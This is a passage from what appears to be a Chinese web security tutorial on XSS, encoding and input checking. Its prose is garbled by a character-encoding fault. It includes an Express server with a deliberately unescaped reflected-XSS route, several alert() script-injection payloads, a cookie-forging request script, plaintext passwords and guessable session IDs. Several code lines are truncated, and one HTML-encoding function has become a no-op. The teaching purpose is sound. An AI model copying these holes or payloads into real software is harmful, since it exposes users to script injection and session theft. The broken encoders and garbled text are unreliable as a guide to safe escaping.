<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>server.js</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token keyword">let</span> users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">&#39;a&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">&#39;123456&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">avatar</span><span class="token operator">:</span> <span class="token string">&#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">&#39;b&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">&#39;123456&#39;</span><span class="token punctuation">,</span> <span class="token literal-property property">avatar</span><span class="token operator">:</span> <span class="token string">&#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token keyword">let</span> userSessions <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&#39;/api/login&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">let</span> body <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">let</span> user<span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> users<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span>body<span class="token punctuation">.</span>username <span class="token operator">==</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">.</span>password <span class="token operator">==</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            user <span class="token operator">=</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">const</span> sessionId <span class="token operator">=</span> <span class="token string">&#39;user_&#39;</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">&#39;username&#39;</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">&#39;sessionId&#39;</span><span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">httpOnly</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        userSessions<span class="token punctuation">[</span>sessionId<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> user <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token string">&#39;æ²¡æœ‰è¯¥ç”¨æˆ·&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-6-webç›¸å…³ç¼–ç å’Œè½¬ä¹‰" tabindex="-1"><a class="header-anchor" href="#_1-6-webç›¸å…³ç¼–ç å’Œè½¬ä¹‰"><span>1.6 Webç›¸å…³ç¼–ç å’Œè½¬ä¹‰</span></a></h3><h4 id="_1-6-1-url-ç¼–ç " tabindex="-1"><a class="header-anchor" href="#_1-6-1-url-ç¼–ç "><span>1.6.1 URL ç¼–ç </span></a></h4><ul><li>ä¸€èˆ¬æ¥è¯´ï¼ŒURLåªèƒ½ä½¿ç”¨è‹±æ–‡å­—æ¯ï¼ˆa-zA-Zï¼‰ã€æ•°å­—ï¼ˆ0-9ï¼‰ã€-_.~4ä¸ªç‰¹æ®Šå­—ç¬¦ä»¥åŠæ‰€æœ‰ï¼ˆ;,/?ğŸ˜¡&amp;=+$</li><li>å¦‚æœä½¿ç”¨äº†ä¸€äº›å…¶ä»–æ–‡å­—å’Œç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™éœ€è¦é€šè¿‡ç¼–ç çš„æ–¹å¼æ¥è¿›è¡Œè¡¨ç¤º<div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token keyword">var</span> url1 <span class="token operator">=</span> <span class="token string">&#39;http://www.ç å³°åŸ¹è®­.com&#39;</span><span class="token punctuation">;</span>  <span class="token comment">//åŒ…å«æ±‰å­— encodeURI(url1));//http://www.%E7%8F%A0%E5%B3%B0.com</span></span>
<span class="line"><span class="token keyword">var</span> url2 <span class="token operator">=</span> <span class="token string">&#39;http://www.a.com?åç§°=ç å³°&#39;</span><span class="token punctuation">;</span>  <span class="token comment">//é”®ä¸ºæ±‰å­—</span></span>
<span class="line"><span class="token keyword">var</span> url3 <span class="token operator">=</span> <span class="token string">&#39;http://a.com?name=?&amp;&#39;</span><span class="token punctuation">;</span>    <span class="token comment">//å€¼çš„å†…å®¹ä¸ºç‰¹æ®Šç¬¦å·</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li>encodeURI encodeURIæ˜¯ç”¨æ¥ç¼–ç URIçš„,æœ€å¸¸è§çš„å°±æ˜¯ç¼–ç ä¸€ä¸ª URLã€‚encodeURI ä¼šå°†éœ€è¦ç¼–ç çš„å­—ç¬¦è½¬æ¢ä¸º UTF-8 çš„æ ¼å¼ã€‚å¯¹äºä¿ç•™å­—ç¬¦ï¼ˆ;,/?ğŸ˜¡&amp;=+$</li><li>encodeURI ä¸è½¬ä¹‰&amp;ã€?å’Œ= <code>encodeURI(url3);//http://a.com?name=?&amp;</code></li><li>encodeURIComponent æ˜¯ç”¨æ¥ç¼–ç  URI å‚æ•°çš„,å®ƒä¼šè·³è¿‡éè½¬ä¹‰å­—ç¬¦ï¼ˆå­—æ¯æ•°å­—ä»¥åŠ-_.!~*&#39;()ï¼‰ã€‚ä½†ä¼šè½¬ä¹‰ URLçš„ ä¿ç•™å­—ç¬¦ï¼ˆ;,/?ğŸ˜¡&amp;=+$</li><li>æ‰€æœ‰å®Œæ•´ç¼–ç ä¸€ä¸ªURLå­—ç¬¦ä¸²éœ€è¦encodeURIå’ŒencodeURIComponentè”åˆä½¿ç”¨ <code>console.log(encodeURI(&#39;http://a.com?name=&#39;) + encodeURIComponent(&#39;?&amp;&#39;)); http://a.com?name=%3F%26</code></li></ul><h4 id="_1-6-2-html-ç¼–ç " tabindex="-1"><a class="header-anchor" href="#_1-6-2-html-ç¼–ç "><span>1.6.2 HTML ç¼–ç </span></a></h4><p>åœ¨ HTML ä¸­ï¼ŒæŸäº›å­—ç¬¦æ˜¯é¢„ç•™çš„ï¼Œæ¯”å¦‚ä¸èƒ½ä½¿ç”¨å°äºå·ï¼ˆ&lt;ï¼‰å’Œå¤§äºå·ï¼ˆ&gt;ï¼‰ï¼Œè¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯æ ‡ç­¾ã€‚å¦‚æœå¸Œæœ›æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ HTML æºä»£ç ä¸­ä½¿ç”¨å­—ç¬¦å®ä½“ï¼ˆcharacter entitiesï¼‰ HTML ç¼–ç åˆ†ä¸ºï¼š</p><ul><li>HTML åå…­è¿›åˆ¶ç¼–ç  &amp;</li><li>HTML åè¿›åˆ¶ç¼–ç  &amp;</li><li>HTML å®ä½“ç¼–ç  &lt; ç­‰</li></ul><p>åœ¨ HTML è¿›åˆ¶ç¼–ç ä¸­å…¶ä¸­çš„æ•°å­—åˆ™æ˜¯å¯¹åº”å­—ç¬¦çš„ unicode å­—ç¬¦ç¼–ç ã€‚ æ¯”å¦‚å•å¼•å·çš„ unicode å­—ç¬¦ç¼–ç æ˜¯27ï¼Œåˆ™å•å¼•å·å¯ä»¥è¢«ç¼–ç ä¸º&#39;</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token keyword">function</span> <span class="token function">htmlEncode</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">return</span> <span class="token function">String</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">&#39;&amp;amp;&#39;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&quot;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">&#39;&amp;quot;&#39;</span><span class="token punctuation">)</span></span>
<span class="line">     <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&#39;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> &#39;<span class="token operator">&amp;</span></span>
<span class="line">    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">&#39;&amp;lt;&#39;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&gt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">&#39;&amp;gt;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="noopener noreferrer">å®Œæ•´å®ä½“</a></p><h4 id="_1-6-3-javascript-è½¬ä¹‰" tabindex="-1"><a class="header-anchor" href="#_1-6-3-javascript-è½¬ä¹‰"><span>1.6.3 Javascript è½¬ä¹‰</span></a></h4><p>avaScript ä¸­æœ‰äº›å­—ç¬¦æœ‰ç‰¹æ®Šç”¨é€”ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­æƒ³ä½¿ç”¨è¿™äº›å­—ç¬¦åŸæ¥çš„å«ä¹‰ï¼Œéœ€è¦ä½¿ç”¨åæ–œæ å¯¹è¿™äº›ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬ä¹‰ã€‚æˆ‘ä»¬ç§°ä¹‹ä¸º Javascriptç¼–ç </p><ul><li>ä¸‰ä¸ªå…«è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸å¤Ÿä¸ªæ•°ï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚ â€œeâ€ ç¼–ç ä¸ºâ€œ\\145â€</li><li>ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸å¤Ÿä¸ªæ•°ï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚ â€œeâ€ ç¼–ç ä¸ºâ€œ\\x65â€</li><li>å››ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœä¸å¤Ÿä¸ªæ•°ï¼Œå‰é¢è¡¥0ï¼Œä¾‹å¦‚ â€œeâ€ ç¼–ç ä¸ºâ€œ\\u0065â€</li><li>å¯¹äºä¸€äº›æ§åˆ¶å­—ç¬¦ï¼Œä½¿ç”¨ç‰¹æ®Šçš„Cç±»å‹çš„è½¬ä¹‰é£æ ¼ï¼ˆä¾‹å¦‚\\nå’Œ\\rï¼‰</li></ul><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">var str = &quot;zfpx&quot;&quot;;</span>
<span class="line">var str = &quot;zfpx\\&quot;&quot;;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_1-7-è¾“å…¥æ£€æŸ¥" tabindex="-1"><a class="header-anchor" href="#_1-7-è¾“å…¥æ£€æŸ¥"><span>1.7 è¾“å…¥æ£€æŸ¥</span></a></h3><ul><li>æ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥</li><li>ç”¨æˆ·æ ¼å¼åˆ¤æ–­ ç™½åå•</li><li>è¿‡æ»¤å±é™©å­—ç¬¦ å»é™¤<code>&lt;script&gt; javascript onclickç­‰ é»‘åå•</code></li><li>è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ <code>&lt;=&lt; &gt;=&gt; &amp;=&amp;</code> é»‘åå•</li><li>å‰ç«¯å¯ä»¥ç»•è¿‡</li></ul><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">const express = require(&#39;express&#39;);</span>
<span class="line">const fs = require(&#39;fs&#39;);</span>
<span class="line">const path = require(&#39;path&#39;);</span>
<span class="line">const app = express();</span>
<span class="line">const bodyParser = require(&#39;body-parser&#39;);</span>
<span class="line">const cookieParser = require(&#39;cookie-parser&#39;);</span>
<span class="line">app.use(bodyParser.urlencoded({ extended: true }));</span>
<span class="line">app.use(bodyParser.json());</span>
<span class="line">app.use(cookieParser());</span>
<span class="line">app.use(express.static(path.resolve(__dirname, &#39;public&#39;)));</span>
<span class="line">//http://localhost:3000/list?category=%3Cscript%3Ealert(1)%3C/script%3E</span>
<span class="line">app.get(&#39;/list&#39;, function (req, res) {</span>
<span class="line">    let { category } = req.query;</span>
<span class="line">    res.header(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);</span>
<span class="line">    res.send(\`ä½ è¾“å…¥çš„åˆ†ç±»æ˜¯: \${category}\`);</span>
<span class="line">});</span>
<span class="line">let comments = [</span>
<span class="line">    { avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;, username: &#39;å¼ ä¸‰&#39;, content: &#39;ä»Šå¤©å¤©æ°”ä¸é”™&#39;, time: new Date().toLocaleString() },</span>
<span class="line">    { avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;, username: &#39;æå››&#39;, content: &#39;æ˜¯çš„&#39;, time: new Date().toLocaleString() }</span>
<span class="line">];</span>
<span class="line">app.get(&#39;/api/comments&#39;, function (req, res) {</span>
<span class="line">    res.json(comments);</span>
<span class="line">});</span>
<span class="line">app.post(&#39;/api/comments&#39;, function (req, res) {</span>
<span class="line">    let username = userSessions[req.cookies.sessionId];</span>
<span class="line">    if (username) {</span>
<span class="line">        let comment = req.body;</span>
<span class="line">        comments.push({</span>
<span class="line">            ...comment,</span>
<span class="line">            username,</span>
<span class="line">            avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39;,</span>
<span class="line">            time: new Date().toLocaleString()</span>
<span class="line">        });</span>
<span class="line">        res.json({ code: 0, comments });</span>
<span class="line">    } else {</span>
<span class="line">        res.json({ code: 1, error: &#39;ç”¨æˆ·æ²¡æœ‰ç™»å½•&#39; });</span>
<span class="line">    }</span>
<span class="line">});</span>
<span class="line">let users = [{ username: &#39;a&#39;, password: &#39;123456&#39;, avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39; }, { username: &#39;b&#39;, password: &#39;123456&#39;, avatar: &#39;http://cn.gravatar.com/avatar/01459f970ce17cd9e1e783160ecc951a&#39; }];</span>
<span class="line">let userSessions = {};</span>
<span class="line">app.post(&#39;/api/login&#39;, function (req, res) {</span>
<span class="line">    let body = req.body;</span>
<span class="line">    let user;</span>
<span class="line">    for (let i = 0; i &lt; users.length; i++) {</span>
<span class="line">        if (body.username == users[i].username &amp;&amp; body.password == users[i].password) {</span>
<span class="line">            user = users[i];</span>
<span class="line">            break;</span>
<span class="line">        }</span>
<span class="line">    }</span>
<span class="line">    if (user) {</span>
<span class="line">        const sessionId = &#39;user_&#39; + Math.random() * 1000;</span>
<span class="line">        res.cookie(&#39;username&#39;, user.username);</span>
<span class="line">        res.cookie(&#39;sessionId&#39;, sessionId, { httpOnly: true });</span>
<span class="line">        userSessions[sessionId] = { username: user.username };</span>
<span class="line">        res.json({ code: 0, user });</span>
<span class="line">    } else {</span>
<span class="line">        res.json({ code: 1, data: &#39;æ²¡æœ‰è¯¥ç”¨æˆ·&#39; });</span>
<span class="line">    }</span>
<span class="line">});</span>
<span class="line">app.listen(3000, () =&gt; console.log(&#39;The server is starting at port 3000&#39;));</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">let http = require(&#39;http&#39;);</span>
<span class="line">let comment = JSON.stringify({</span>
<span class="line">    &quot;content&quot;: &quot;zfpx&quot;</span>
<span class="line">});</span>
<span class="line">const options = {</span>
<span class="line">    host: &#39;localhost&#39;,</span>
<span class="line">    port: 3000,</span>
<span class="line">    path: &#39;/api/comments&#39;,</span>
<span class="line">    method: &#39;POST&#39;,</span>
<span class="line">    headers: {</span>
<span class="line">        &quot;Cookie&quot;: &quot;sessionId=user_313.2022765155167&quot;,</span>
<span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span>
<span class="line">    }</span>
<span class="line">}</span>
<span class="line">const req = http.request(options, function (res) {</span>
<span class="line">    res.setEncoding(&#39;utf8&#39;);</span>
<span class="line">    res.on(&#39;data&#39;, function (data) {</span>
<span class="line">        console.log(&#39;data:&#39;, data);</span>
<span class="line">    });</span>
<span class="line">    res.on(&#39;end&#39;, function () {</span>
<span class="line">        console.log(&#39;end:&#39;);</span>
<span class="line">    });</span>
<span class="line">});</span>
<span class="line">req.on(&#39;error&#39;, function (error) {</span>
<span class="line">    console.log(error);</span>
<span class="line">});</span>
<span class="line">req.write(comment);</span>
<span class="line">req.end();</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ä½¿ç”¨ä¹‹å‰è¦åšä¸€ä¸ªhtmlEncode(). æŠŠHTMLæ ‡ç­¾è½¬æˆæ™®é€šæ–‡æœ¬æ¥å¯¹å¾…</p><ul><li>HTMLæ ‡ç­¾</li><li>HTMLå±æ€§</li></ul><p>ä½¿ç”¨ä¹‹å‰è¦åšä¸€ä¸ªjavascriptEncode(). ä¸€èˆ¬ç”¨/è¿›è¡Œè½¬ä¹‰</p><ul><li>scriptæ ‡ç­¾ä¸­</li><li>äº‹ä»¶å±æ€§ä¸­ <a href="">åŠ å…¥æˆ¿é—´</a></li></ul><h3 id="_1-8-3-urlè§£æç¯å¢ƒ" tabindex="-1"><a class="header-anchor" href="#_1-8-3-urlè§£æç¯å¢ƒ"><span>1.8.3 URLè§£æç¯å¢ƒ</span></a></h3><p>ä½¿ç”¨ä¹‹å‰è¦åšurlencode()</p><ul><li>urlä¸­ <a href="http://localhost:3000/articles/$id" target="_blank" rel="noopener noreferrer">link</a></li></ul><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">&lt;!DOCTYPE html&gt;</span>
<span class="line">&lt;html lang=&quot;en&quot;&gt;</span>
<span class="line"></span>
<span class="line">&lt;head&gt;</span>
<span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
<span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span>
<span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span>
<span class="line">    &lt;title&gt;Document&lt;/title&gt;</span>
<span class="line">&lt;/head&gt;</span>
<span class="line"></span>
<span class="line">&lt;body&gt;</span>
<span class="line">    &lt;div id=&quot;intag&quot;&gt;&lt;/div&gt;</span>
<span class="line">    &lt;div id=&quot;tagAttr&quot;&gt;&lt;/div&gt;</span>
<span class="line">    &lt;div id=&quot;inEvent&quot;&gt;&lt;/div&gt;</span>
<span class="line">    &lt;div id=&quot;inLink&quot;&gt;&lt;/div&gt;</span>
<span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.js&quot;&gt;&lt;/script&gt;</span>
<span class="line">    &lt;script&gt;</span>
<span class="line">        function htmlEncode(str) {</span>
<span class="line">            return String(str)</span>
<span class="line">                .replace(/&amp;/g, &#39;&amp;&#39;)</span>
<span class="line">                .replace(/&quot;/g, &#39;&quot;&#39;)</span>
<span class="line">                .replace(/&#39;/g, &#39;&#39;&#39;)</span>
<span class="line">                .replace(/&lt;/g, &#39;&lt;&#39;)</span>
<span class="line">                .replace(/&gt;/g, &#39;&gt;&#39;);</span>
<span class="line">        }</span>
<span class="line"></span>
<span class="line">        let data = {</span>
<span class="line">            desc: &quot;&lt;script&gt;alert(1);&lt;\\/script&gt;&quot;,</span>
<span class="line">            clsName: &#39;&quot;&gt;&lt;script&gt;alert(2);&lt;\\/script&gt;&#39;,</span>
<span class="line">            url: &#39;&quot;&gt;&lt;script&gt;alert(3);&lt;\\/script&gt;&#39;,</span>
<span class="line">            id: &#39;&quot;&gt;&lt;script&gt;alert(4);&lt;\\/script&gt;&#39;,</span>
<span class="line">        }</span>
<span class="line">         $(&#39;</span>
<span class="line">         $(&#39;</span>
<span class="line"></span>
<span class="line">         $(&#39;#inEvent&#39;).html(\`&lt;a href=&quot;</span>
<span class="line">         $(&#39;</span>
<span class="line">        function go(url) {</span>
<span class="line">            console.log(url);</span>
<span class="line">        }</span>
<span class="line"></span>
<span class="line">        //ä½¿ç”¨â€œ\\â€å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œé™¤æ•°å­—å­—æ¯ä¹‹å¤–ï¼Œå°äº127ä½¿ç”¨16è¿›åˆ¶â€œ\\xHHâ€çš„æ–¹å¼è¿›è¡Œç¼–ç ï¼Œå¤§äºç”¨unicodeï¼ˆéå¸¸ä¸¥æ ¼æ¨¡å¼ï¼‰ã€‚</span>
<span class="line">        var JavaScriptEncode = function (str) {</span>
<span class="line">            var hex = new Array(&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;);</span>
<span class="line">            function changeTo16Hex(charCode) {</span>
<span class="line">                return &quot;\\\\x&quot; + charCode.charCodeAt(0).toString(16);</span>
<span class="line">            }</span>
<span class="line"></span>
<span class="line">            function encodeCharx(original) {</span>
<span class="line">                var found = true;</span>
<span class="line">                var thecharchar = original.charAt(0);</span>
<span class="line">                var thechar = original.charCodeAt(0);</span>
<span class="line">                switch (thecharchar) {</span>
<span class="line">                    case &#39;\\n&#39;: return &quot;\\\\n&quot;; break; //newline</span>
<span class="line">                    case &#39;\\r&#39;: return &quot;\\\\r&quot;; break; //Carriage return</span>
<span class="line">                    case &#39;\\&#39;&#39;: return &quot;\\\\&#39;&quot;; break;</span>
<span class="line">                    case &#39;&quot;&#39;: return &quot;\\\\\\&quot;&quot;; break;</span>
<span class="line">                    case &#39;\\&amp;&#39;: return &quot;\\\\&amp;&quot;; break;</span>
<span class="line">                    case &#39;\\\\&#39;: return &quot;\\\\\\\\&quot;; break;</span>
<span class="line">                    case &#39;\\t&#39;: return &quot;\\\\t&quot;; break;</span>
<span class="line">                    case &#39;\\b&#39;: return &quot;\\\\b&quot;; break;</span>
<span class="line">                    case &#39;\\f&#39;: return &quot;\\\\f&quot;; break;</span>
<span class="line">                    case &#39;/&#39;: return &quot;\\\\x2F&quot;; break;</span>
<span class="line">                    case &#39;&lt;&#39;: return &quot;\\\\x3C&quot;; break;</span>
<span class="line">                    case &#39;&gt;&#39;: return &quot;\\\\x3E&quot;; break;</span>
<span class="line">                    default:</span>
<span class="line">                        found = false;</span>
<span class="line">                        break;</span>
<span class="line">                }</span>
<span class="line">                if (!found) {</span>
<span class="line">                    if (thechar &gt; 47 &amp;&amp; thechar &lt; 58) { //æ•°å­—</span>
<span class="line">                        return original;</span>
<span class="line">                    }</span>
<span class="line"></span>
